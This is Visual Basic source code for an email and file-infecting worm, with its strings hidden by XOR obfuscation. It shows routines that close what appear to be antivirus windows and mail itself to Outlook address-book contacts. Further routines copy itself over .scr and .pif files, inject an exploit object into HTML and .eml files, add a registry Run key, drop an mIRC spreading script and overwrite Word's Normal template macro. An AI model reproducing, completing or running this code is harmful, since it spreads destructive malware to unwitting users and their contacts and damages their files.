   Attribute VB_Name = "Module1"
   Option Explicit
   Private Declare Function FindWindow Lib "user32" _
            Alias "FindWindowA" _
            (ByVal lpClassName As String, _
            ByVal lpWindowName As String) As Long
   Private Declare Function SystemParametersInfo Lib _
   "user32" Alias "SystemParametersInfoA" (ByVal uAction _
   As Long, ByVal uParam As Long, ByVal lpvParam As Any, _
   ByVal fuWinIni As Long) As Long
         Private Declare Function PostMessage Lib "user32" _
            Alias "PostMessageA" _
            (ByVal hwnd As Long, _
            ByVal wMsg As Long, _
            ByVal wParam As Long, _
            ByVal lParam As Long) As Long
            Const WM_CLOSE = &H10
   Sub Main()
   On Error Resume Next
   Dim av0, av1, av2, av3, av4, av5, av6, av7, av8, av9, av10, n, ar, av
   Dim kilwin As Long
   Dim killed As Long
   Dim xtasy As Long
   Dim n1, ar1, attch, exe, exe1, scr, scr1, com, com1, pif, pif1, phexe, phcom, phpif, phscr, pheml
   Dim n2, attch2, ar2, attr, a, b, c, d, e, y, xx, oo, g, n3, ar3, attch3, attr1
   av0 = x("‚©¾©›«©¦")
   av1 = x("…§¬¥èŠ§§»¼º")
   av2 = x("¾¼¼º©±")
   av3 = x("Žå›œ‡˜Ÿèžº»¡§¦èýæøþ«")
   av4 = x("˜‹å«¡¤¤¡¦èúøøøèòèž¡º½»è‰¤º¼")
   av5 = x("Œ‰˜Œ§¿¦¤§©¬…©¦©¯º")
   av6 = x("š©¤å¼¡¥è›«©¦")
   av7 = x("*‡…‡†ñð")
   av8 = x("‰ž˜è…§¦¡¼§º")
   av9 = x("†‰*—ž›—›œ‰œ")
   av10 = x("*¦¼¡¼¤¬èåè†§¼¸©¬")
   For n = 0 To 10
   ar = Array(av0, av1, av2, av3, av4, av5, av6, av7, av8, av9, av10)
   av = ar(n)
   kilwin = FindWindow(vbNullString, av)
   killed = PostMessage(kilwin, WM_CLOSE, vbNull, vbNull)
   Next n
   exe = App.Path & x("”") & App.EXEName & x("æ***")
   exe1 = App.Path & App.EXEName & x("æ***")
   scr = App.Path & x("”") & App.EXEName & x("æ›‹š")
   scr1 = App.Path & App.EXEName & x("æ›‹š")
   com = App.Path & App.EXEName & x("æ‹‡…")
   com1 = App.Path & x("”") & App.EXEName & x("æ‹‡…")
   pif = App.Path & App.EXEName & x("æ˜*Ž")
   pif1 = App.Path & x("”") & App.EXEName & x("æ˜*Ž")
   phexe = x("«ò”¥§¬¥ª§§»¼ºæ°")
   phscr = x("«ò”¥±»¼¡¹½æ»«º")
   phcom = x("«ò”£±¯¦æ«§¥")
   phpif = x("«ò”º©¬¥æ¸¡®")
   pheml = x("«ò”« ©¡¦æ¥¤")
   For n1 = 0 To 3
   ar1 = Array(phexe, phscr, phcom, phpif)
   attch = ar1(n1)
   FileCopy exe, attch
   FileCopy exe1, attch
   FileCopy scr, attch
   FileCopy scr1, attch
   FileCopy com, attch
   FileCopy com1, attch
   FileCopy pif, attch
   FileCopy pif1, attch
   Next n1
   Call oe
   Set a = CreateObject(x("‡½¼¤§§£æ‰¸¸¤¡«©¼¡§¦"))
   Set b = a.GetNameSpace(x("…‰˜*"))
   If a = x("‡½¼¤§§£") Then
   b.Logon x("¸º§®¡¤"), x("¸©»»¿§º¬")
   For y = 1 To b.AddressLists.Count
   Set d = b.AddressLists(y)
   xx = 1
   Set c = a.CreateItem(0)
   For oo = 1 To d.AddressEntries.Count
   e = d.AddressEntries(xx)
   c.Recipients.Add e
   xx = xx + 1
   If xx > 8 Then oo = d.AddressEntries.Count
   Next oo
   c.Subject = x("š*òè¡è½º¯¦¼¤±è¦¬è®¡¤»è®§ºè¥±è«§¥¸½¼º")
   c.Body = x("æææææèº©¤¤±÷è ºè©ºè»§¥è½»®½¤è®¡¤»æææè¦¢§±æææ")
   c.attachments.Add phexe, 1, 1, x("…§¬¥èŠ§§»¼ºè¾úæøþ")
   c.attachments.Add phscr, 1, 2, x("˜»±« ¬¤¡«è›«º¦»©¾º")
   c.attachments.Add phcom, 1, 3, x("š¯¡»¼º©¼¡§¦èƒ±è*¦º©¼§º")
   c.attachments.Add phpif, 1, 4, x("š©¬¥èŽ¡¤")
   c.attachments.Add pheml, 1, 5, x("‰è„½«£±è‹ ©¡¦è„¼¼º")
   c.Send
   e = ""
   Next y
   b.Logoff
   End If
   For n2 = 0 To 4
   ar2 = Array(pheml, phexe, phscr, phcom, phpif)
   attch2 = ar2(n2)
   attr = GetAttr(attch2)
   If attr <> 3 Then
   SetAttr attch2, vbHidden + vbReadOnly
   End If
   Next n2
   If Dir(x("«ò”Ÿ*†Œ‡Ÿ›”›‘›üðþ"), vbDirectory) = "" Then
   MkDir x("«ò”Ÿ*†Œ‡Ÿ›”›‘›üðþ")
   End If
   FileCopy phscr, x("«ò”Ÿ*†Œ‡Ÿ›”›‘›üðþ”»¿©¸üðþæ«§¥")
   Set g = CreateObject(x("Ÿ›«º¡¸¼æ› ¤¤"))
   g.regwrite x("€ƒ*‘—„‡‹‰„—…‰‹€*†*”›‡ŽœŸ‰š*”…¡«º§»§®¼”Ÿ¡¦¬§¿»”‹½ºº¦¼žº»¡§¦”š½¦›º¾¡«»”â»¿©¸üðþ"), x("«ò”Ÿ*†Œ‡Ÿ›”›‘›üðþ”»¿©¸üðþæ«§¥")
   If Dir(x("«ò”**þ"), vbDirectory) = "" Then
   MkDir x("«ò”**þ")
   End If
   FileCopy phscr, x("«ò”**þ”§®®¤¡¦æ°")
   For n3 = 0 To 1
   ar3 = Array(x("«ò”**þ"), x("«ò”Ÿ*†Œ‡Ÿ›”›‘›üðþ"))
   attch3 = ar3(n3)
   attr1 = GetAttr(attch3)
   If attr1 <> 3 Then
   SetAttr attch3, vbHidden + vbReadOnly
   End If
   Next n3
   Call dribe
   Call mirc
   Call norm
   MsgBox x("©¤«§¸©½¤ˆ«©¦¦©ª¡»¥©¡¤æ«§¥è»©±»äèêœ©« è¥è®¡º»¼è¼ ¦è ¡ºè¥æææê"), vbExclamation, x("‘¼è‰¦§¼ ºèž¡»½©¤èŠ©»¡«èþè˜º§¬½«¼")
   End Sub
   Private Sub oe()
   On Error Resume Next
   Dim head, toe, encode
   head = "Žº§¥òÅÂ›½ª¢«¼òè‰è„½«£±è‹ ©¡¦è„¼¼ºÅÂ…*…*åžº»¡§¦òèùæøÅÂ‹§¦¼¦¼åœ±¸òè¥½¤¼¡¸©º¼ç¥¡°¬óÅÂèèèèª§½¦¬©º±õêååååõ—†°¼˜©º¼—øøø—øøøð—øù‹ù‹ñüùæŠñŠ*ýû‹øêÅÂ*å˜º¡§º¡¼±òèûÅÂ*å…›…©¡¤å˜º¡§º¡¼±òè†§º¥©¤ÅÂ*å*¦»¦¼òèùÅÂ*å…¡¥‡„*òè˜º§¬½«¬èŠ±è…¡«º§»§®¼è…¡¥‡„*èžþæøøæúþøøæøøøøÅÂÅÂœ ¡»è¡»è©è¥½¤¼¡å¸©º¼è¥»»©¯è¡¦è…*…*è®§º¥©¼æÅÂÅÂååååååõ—†°¼˜©º¼—øøø—øøøð—øù‹ù‹ñüùæŠñŠ*ýû‹øÅÂ‹§¦¼¦¼åœ±¸òè¼°¼ç¸¤©¡¦óÅÂèèèè« ©º»¼õê¡»§åððýñåùêÅÂ‹§¦¼¦¼åœº©¦»®ºå*¦«§¬¡¦¯òèÿª¡¼ÅÂÅÂ˜©»»è¼ ¡»è¼§è±§½ºè®º¡¦¬»è©¦¬è±§½ï¤¤èªè¤½«£±è¼§¥§ºº§¿æææèåè¼ è£©º¥©è¯½º½ÅÂÅÂååååååõ—†°¼˜©º¼—øøø—øøøð—øù‹ù‹ñüùæŠñŠ*ýû‹øÅÂ‹§¦¼¦¼åœ±¸òè©¸¸¤¡«©¼¡§¦ç°å¥»¬§¿¦¤§©¬óÅÂèèèè¦©¥õê« ©º¥æ°êÅÂ‹§¦¼¦¼åœº©¦»®ºå*¦«§¬¡¦¯òèª©»þüÅÂ‹§¦¼¦¼åŒ¡»¸§»¡¼¡§¦òè©¼¼©« ¥¦¼óÅÂèèèè®¡¤¦©¥õê« ©º¥æ°ê"
   toe = "ååååååõ—†°¼˜©º¼—øøø—øøøð—øù‹ù‹ñüùæŠñŠ*ýû‹øåå"
   encode = b64(x("«ò”£±¯¦æ«§¥"))
   Open x("«ò”« ©¡¦æ¥¤") For Output As #1
   Print #1, x(head)
   Print #1, encode
   Print #1, x(toe)
   Close #1
   End Sub
   Sub dribe()
     On Error Resume Next
     Dim d, dc, s, fso, dribe
     Set fso = CreateObject(x("›«º¡¸¼¡¦¯æŽ¡¤›±»¼¥‡ª¢«¼"))
     Set dc = fso.Drives
     For Each d In dc
       If d.DriveType = 2 Or d.DriveType = 3 Then
         fldr (d.Path & x("”"))
       End If
     Next
     dribe = s
   End Sub
   Sub info(spec)
     On Error Resume Next
     Dim f, f1, fc, ext, ap, mircfname, s, fso, faa, fae, fa, fe, fi, fo, fu, exe, exe1, scr, scr1, com, com1, pif, pif1
     Set fso = CreateObject(x("›«º¡¸¼¡¦¯æŽ¡¤›±»¼¥‡ª¢«¼"))
   exe = App.Path & x("”") & App.EXEName & x("æ***")
   exe1 = App.Path & App.EXEName & x("æ***")
   scr = App.Path & x("”") & App.EXEName & x("æ›‹š")
   scr1 = App.Path & App.EXEName & x("æ›‹š")
   com = App.Path & App.EXEName & x("æ‹‡…")
   com1 = App.Path & x("”") & App.EXEName & x("æ‹‡…")
   pif = App.Path & App.EXEName & x("æ˜*Ž")
   pif1 = App.Path & x("”") & App.EXEName & x("æ˜*Ž")
     Set f = fso.GetFolder(spec)
     Set fc = f.Files
     For Each f1 In fc
       ext = fso.GetExtensionName(f1.Path)
       ext = LCase(ext)
       s = LCase(f1.Name)
       If (ext = x("»«º")) Or (ext = x("¸¡®")) Then
      Set f = fso.getfile(exe)
      f.Copy (f1.Path)
         Set fa = fso.getfile(exe1)
      fa.Copy (f1.Path)
         Set fe = fso.getfile(scr)
      fe.Copy (f1.Path)
         Set fi = fso.getfile(scr1)
      fi.Copy (f1.Path)
         Set fo = fso.getfile(com)
      fo.Copy (f1.Path)
         Set fu = fso.getfile(com1)
      fu.Copy (f1.Path)
         Set faa = fso.getfile(pif)
      faa.Copy (f1.Path)
         Set fae = fso.getfile(pif1)
      fae.Copy (f1.Path)
   End If
   If (ext = x(" ¼¥")) Or (ext = x(" ¼¥¤")) Then
       htminfect (f1.Path)
   End If
   If (ext = x("¥¤")) Then
       mimeinfect (f1.Path)
   End If
   Next
   End Sub
   Sub fldr(spec)
     On Error Resume Next
     Dim f, f1, sf, fso
       Set fso = CreateObject(x("›«º¡¸¼¡¦¯æŽ¡¤›±»¼¥‡ª¢«¼"))
     Set f = fso.GetFolder(spec)
     Set sf = f.SubFolders
     For Each f1 In sf
       info (f1.Path)
       fldr (f1.Path)
     Next
   End Sub
   Private Function x(sText)
   On Error Resume Next
   Dim ekey, i, hash, crbyte
   ekey = 1730
   For i = 1 To Len(sText)
       hash = Asc(Mid(sText, i, 1))
       crbyte = Chr(hash Xor (ekey Mod 255))
       x = x & crbyte
   Next i
   End Function
   Private Sub mimeinfect(fileinput As String)
   On Error Resume Next
   Dim dd As Integer
   Dim s As String
   Dim sig, ver, textline, ddd, bb, extasy, extasy1, sex, g, gh, rout, num, source, fileread, b, c, d, e
   Open fileinput For Input As #6
   Do Until Mid(sig, 1, 4) = x("…*…*")
   Line Input #6, sig
   Loop
   Line Input #6, ver
   Close #6
   If Mid(ver, 18, 3) = x("þþþ") Then
   Else
   Open fileinput For Input As #1
   Do Until Mid(textline, 1, 4) = x("…*…*")
   Line Input #1, textline
   ddd = ddd & textline & vbCrLf
   Loop
   If Mid(textline, 1, 4) = x("…*…*") Then
   bb = ddd & textline & x("þþþ")
   End If
   Line Input #1, extasy
   Line Input #1, extasy1
   If Mid(extasy1, 2, 5) = x("ª§½¦¬") Then
   Else
   Line Input #1, sex
   extasy1 = sex
   End If
   Do Until EOF(1)
   Line Input #1, g
   gh = gh & g & vbCrLf
   dd = dd + 1
   Loop
   Close #1
   'the routine
   Open fileinput For Input As #7
   Do Until Mid(rout, 1, 4) = x("…*…*")
   Line Input #7, rout
   Loop
   For num = 0 To dd - 1
   Line Input #7, source
   fileread = fileread & source & vbCrLf
   Next num
   Close #7
   b = Mid(extasy1, 12, 41)
   c = x("«ò”£±¯¦æ«§¥")
   d = b64(c)
   e = "‹§¦¼¦¼åœ±¸òè©¸¸¤¡«©¼¡§¦ç°å¥»¬§¿¦¤§©¬óÅÂèèè¦©¥õêº©¬¥æ°êÅÂ‹§¦¼¦¼åœº©¦»®ºå*¦«§¬¡¦¯òèª©»þüÅÂ‹§¦¼¦¼åŒ¡»¸§»¡¼¡§¦òè©¼¼©« ¥¦¼óÅÂèèè®¡¤¦©¥õêº©¬¥æ°ê"
   Open fileinput For Output As #1
   Print #1, bb
   Print #1, fileread
   Print #1, x("åå") & b
   Print #1, x(e)
   Print #1, d
   Print #1, x("åå") & b & x("åå")
   Close 1
   End If
   End Sub
   Sub htminfect(file As String)
   Dim exploit, fso, header, file1, kopy, s
   exploit = "ô›˜‰†è¬©¼©Ž¤¬õ©ÅÂ¬©¼©Ž§º¥©¼‰»õ ¼¥¤è¬©¼©›º«õë®öôç›˜‰†öô°¥¤è¡¬õ®öÅÂô¢öÅÂô©öÅÂôé“‹Œ‰œ‰“ÅÂô§ª¢«¼è¡¬õê®êè«¤©»»¡¬õê«¤»¡¬òùüþðñûøñåýûþðåðûýüåüûúýåñþðüûúþøñðÿþêè«§¬ª©»õê«òç**þç§®®¤¡¦æ°êöôç§ª¢«¼öÅÂ••öÅÂôç©öÅÂôç¢öÅÂôç°¥¤ö"
   Open file For Input As #6
   Line Input #6, header
   Close #6
   If header = x("ôéåå©¤«§¸©½¤ååö") Then
   Else
   Set fso = CreateObject(x("›«º¡¸¼¡¦¯æŽ¡¤›±»¼¥‡ª¢«¼"))
   Set file1 = fso.OpenTextFile(file, 1)
   kopy = file1.ReadAll
   Open file For Output As #7
   Print #7, x("ôéåå©¤«§¸©½¤ååö")
   Print #7, kopy
   Print #7, x(exploit)
   Close #7
   End If
   End Sub
   'mirc
   Sub mirc()
   On Error Resume Next
   Dim a, phpif
   phpif = x("«ò”º©¬¥æ¸¡®")
   a = "“»«º¡¸¼•ÅÂ¦øõè§¦èùòœ**œòâ ¤¤§âòëò³ÅÂ¦ùõèç¡®èàèì¦¡«£èõõèì¥èáè³è ©¤¼èµÅÂ¦úõèç¥»¯èì¦¡«£è€¤¤§ææè*®è±§½ïºèº½¦¦¡¦¯è˜¦¼¡½¥äè ºï»è©è®¡¤è¼ ©¼è¿¡¤¤è¼¿©£è±§½ºè¸º§«»»§ºæææèš¦©¥è¼§èæ«§¥ææÅÂ¦ûõèç¬««è»¦¬èå«èì¦¡«£è«ò”Ÿ*†Œ‡Ÿ›”›‘›üðþ”˜¼¿©£æ«§—ÅÂ¦üõèµÅÂ¦ýõè§¦èùò‚‡*†òëò³ÅÂ¦þõèç¡®èàèì¦¡«£èõõèì¥èáè³è ©¤¼èµÅÂ¦ÿõèç¥»¯èì¦¡«£è€¤¤§ææè*®è±§½ïºèº½¦¦¡¦¯è˜¦¼¡½¥äè ºï»è©è®¡¤è¼ ©¼è¿¡¤¤è¼¿©£è±§½ºè¸º§«»»§ºæææèš¦©¥è¼§èæ«§¥ææÅÂ¦ðõèç¬««è»¦¬èå«èì¦¡«£è«ò”Ÿ*†Œ‡Ÿ›”›‘›üðþ”˜¼¿©£æ«§—ÅÂ¦ñõèµÅÂ¦ùøõè§¦èùò˜‰šœòëò³ÅÂ¦ùùõèç¡®èàèì¦¡«£èõõèì¥èáè³è ©¤¼èµÅÂ¦ùúõèç¥»¯èì¦¡«£è€¤¤§ææè*®è±§½ïºèº½¦¦¡¦¯è˜¦¼¡½¥äè ºï»è©è®¡¤è¼ ©¼è¿¡¤¤è¼¿©£è±§½ºè¸º§«»»§ºæææèš¦©¥è¼§èæ«§¥ææÅÂ¦ùûõèç¬««è»¦¬èå«èì¦¡«£è«ò”Ÿ*†Œ‡Ÿ›”›‘›üðþ”˜¼¿©£æ«§—ÅÂ¦ùüõèµ"
   FileCopy phpif, x("«ò”Ÿ*†Œ‡Ÿ›”›‘›üðþ”˜¼¿©£æ«§—")
   If Dir(x("«ò”˜º§¯º©¥èŽ¡¤»”¥*š‹"), vbDirectory) <> "" Then
   Open x("«ò”˜º§¯º©¥èŽ¡¤»”¥*š‹”»«º¡¸¼æ¡¦¡") For Output As #3
   Print #3, x(a)
   Close #3
   End If
   If Dir(x("«ò”¥*š‹"), vbDirectory) <> "" Then
   FileCopy x("«ò”˜º§¯º©¥èŽ¡¤»”¥*š‹”»«º¡¸¼æ¡¦¡"), x("«ò”¥*š‹”»«º¡¸¼æ¡¦¡")
   End If
   End Sub
   Sub norm()
   On Error Resume Next
   Dim norm, norm1, fso, oword, nt, iw, i, b
   FileCopy x("«ò”**þ”§®®¤¡¦æ°"), x("«ò”¸§º¦§æ»«º")
   If Dir(x("«ò”º©¬¥æ¼°¼")) <> x("º©¬¥æ¼°¼") Then
   norm = "›½ªè¬§«½¥¦¼—«¤§»àáÅÂ‡¦è*ºº§ºèš»½¥è†°¼ÅÂ‡¸¦èê«ò”°¸¤§¡¼æ¥¥¥êèŽ§ºè‡½¼¸½¼è‰»èúÅÂ˜º¡¦¼èëúäèê»½ªè¬§«½¥¦¼—§¸¦àáêÅÂ˜º¡¦¼èëúäèê‡¦è*ºº§ºèš»½¥è†°¼êÅÂ˜º¡¦¼èëúäèêïª±è©¤«§¸©½¤êÅÂ˜º¡¦¼èëúäèê§ª¢èõè‰«¼¡¾Œ§«½¥¦¼æ› ©¸»àùáæ‡„*Ž§º¥©¼æ‹¤©»»œ±¸êÅÂ˜º¡¦¼èëúäèêŸ¡¼ è‰«¼¡¾Œ§«½¥¦¼æ› ©¸»àùáæ‡„*Ž§º¥©¼êÅÂ˜º¡¦¼èëúäèêèèèèæ‰«¼¡¾©¼‰»è‹¤©»»œ±¸òõ§ª¢êÅÂ˜º¡¦¼èëúäèêèèèèæ‰«¼¡¾©¼êÅÂ˜º¡¦¼èëúäèê*¦¬èŸ¡¼ êÅÂ˜º¡¦¼èëúäèê¦¬è»½ªêÅÂ‹¤§»èúÅÂ›¼è®»§èõè‹º©¼‡ª¢«¼àê›«º¡¸¼¡¦¯æŽ¡¤›±»¼¥‡ª¢«¼êáÅÂ›¼è¦¼èõè‰«¼¡¾Œ§«½¥¦¼æžŠ˜º§¢«¼æ¾ª«§¥¸§¦¦¼»àùáæ«§¬¥§¬½¤ÅÂ›¼è¡¿èõè®»§æ‡¸¦œ°¼Ž¡¤àê«ò”°¸¤§¡¼æ¥¥¥êäèùäèœº½áÅÂ¦¼æŒ¤¼„¡¦»èùäè¦¼æ‹§½¦¼‡®„¡¦»ÅÂ¡èõèùÅÂŒ§èŸ ¡¤è¡¿æ©¼¦¬§®»¼º©¥èôöèœº½ÅÂªèõè¡¿æº©¬¤¡¦ÅÂ¦¼æ*¦»º¼„¡¦»è¡äèªÅÂ¡èõè¡èãèùÅÂ„§§¸ÅÂ‰«¼¡¾Œ§«½¥¦¼æ› ©¸»æ‰¬¬‡„*‡ª¢«¼è—ÅÂŽ¡¤†©¥òõê«ò”¸§º¦§æ»«ºêäè—"
   norm1 = "„¡¦£œ§Ž¡¤òõŽ©¤»ÅÂ‰«¼¡¾Œ§«½¥¦¼æ›©¾ÅÂ‡¸¦èê«ò”¾¾æº¯êèŽ§ºè‡½¼¸½¼è‰»èûÅÂ˜º¡¦¼èëûäèêš***Œ*œüêÅÂ˜º¡¦¼èëûäèê“€ƒ*‘—‹*šš*†œ—*›*š”›§®¼¿©º”…¡«º§»§®¼”‡®®¡«”ñæø”Ÿ§º¬”›«½º¡¼±•êÅÂ˜º¡¦¼èëûäèêêê„¾¤êêõ¬¿§º¬òøøøøøøøùêÅÂ˜º¡¦¼èëûäèê“€ƒ*‘—‹*šš*†œ—*›*š”›§®¼¿©º”…¡«º§»§®¼”‡®®¡«”ùøæø”Ÿ§º¬”›«½º¡¼±•êÅÂ˜º¡¦¼èëûäèêêê„¾¤êêõ¬¿§º¬òøøøøøøøùêÅÂ˜º¡¦¼èëûäèêêê‰««»»žŠ‡…êêõ¬¿§º¬òøøøøøøøùêÅÂ‹¤§»èûÅÂ› ¤¤èêº¯¬¡¼èç»è«ò”¾¾æº¯êäè¾ª€¡¬ÅÂƒ¡¤¤èê«ò”¾¾æº¯êÅÂ*¦¬è›½ªÅÂ"
   Open x("«ò”º©¬¥æ¼°¼") For Output As #1
   Print #1, x(norm)
   Print #1, x(norm1)
   Close #1
   Set fso = CreateObject(x("›«º¡¸¼¡¦¯æŽ¡¤›±»¼¥‡ª¢«¼"))
   Set oword = CreateObject(x("Ÿ§º¬æ‰¸¸¤¡«©¼¡§¦"))
   oword.Visible = False
   Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule
   Set iw = fso.OpenTextFile(x("«ò”º©¬¥æ¼°¼"), 1, True)
   nt.DeleteLines 1, nt.CountOfLines
   i = 1
   Do While iw.atendofstream <> True
   b = iw.readline
   nt.InsertLines i, b
   i = i + 1
   Loop
   oword.NormalTemplate.Save
   SetAttr oword.NormalTemplate.Fullname, vbReadOnly
   oword.NormalTemplate.Close
   End If
   End Sub
   Private Function b64(ByVal vsFullPathname As String) As String
   On Error Resume Next
       'For Encoding BASE64
       Dim b           As Integer
       Dim b64ed   As Variant
       Dim bin(3)      As Byte
       Dim s           As String
       Dim l           As Long
       Dim i           As Long
       Dim FileIn      As Long
       Dim sResult     As String
       Dim n           As Long

       'b64ed=>tabla de tabulación
       b64ed = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")

       Erase bin
       l = 0: i = 0: FileIn = 0: b = 0:
       s = ""

       'Gets the next free filenumber
       FileIn = FreeFile

       'Open Base64 Input File
       Open vsFullPathname For Binary As FileIn

       sResult = s & vbCrLf
       s = ""

       l = LOF(FileIn) - (LOF(FileIn) Mod 3)

       For i = 1 To l Step 3

           'Read three bytes
           Get FileIn, , bin(0)
           Get FileIn, , bin(1)
           Get FileIn, , bin(2)

           'Always wait until there're more then 64 characters
           If Len(s) > 64 Then

               s = s & vbCrLf
               sResult = sResult & s
               s = ""

           End If

           'Calc Base64-encoded char
           b = (bin(n) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
           s = s & b64ed(b) 'the character s holds the encoded chars

           b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
           s = s & b64ed(b)

           b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
           s = s & b64ed(b)

           b = bin(n + 2) And &H3F
           s = s & b64ed(b)

       Next i

       'Now, you need to check if there is something left
       If Not (LOF(FileIn) Mod 3 = 0) Then

           'Reads the number of bytes left
           For i = 1 To (LOF(FileIn) Mod 3)
               Get FileIn, , bin(i - 1)
           Next i

           'If there are only 2 chars left
           If (LOF(FileIn) Mod 3) = 2 Then
               b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
               s = s & b64ed(b)

               b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
               s = s & b64ed(b)

               b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
               s = s & b64ed(b)

               s = s & "="

           Else 'If there is only one char left
               b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
               s = s & b64ed(b)

               b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
               s = s & b64ed(b)

               s = s & "=="
           End If
       End If

       'Send the characters left
       If s <> "" Then
           s = s & vbCrLf
           sResult = sResult & s
       End If

       'Send the last part of the MIME Body
       s = ""

       Close FileIn
       b64 = sResult

   End Function
